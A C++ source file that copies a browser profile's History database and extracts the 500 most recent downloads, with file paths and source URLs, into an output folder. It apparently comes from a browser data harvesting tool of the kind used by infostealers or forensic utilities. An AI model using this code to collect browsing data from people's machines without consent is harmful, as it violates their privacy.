//
// Created by .1qxz on 08.06.2024.
//

#include "CDownloads.h"

void CDownloads::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> downloads;
    SQLiteUtil::connectAndRead("SELECT current_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 500", copied_db, [&downloads](sqlite3_stmt* stmt) {
        auto download = std::make_unique<Download>();
        download->saved_as = SQLiteUtil::readString(stmt, 0);
        download->url = SQLiteUtil::readString(stmt, 1);

        downloads.push_back(std::move(download));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, downloads);
}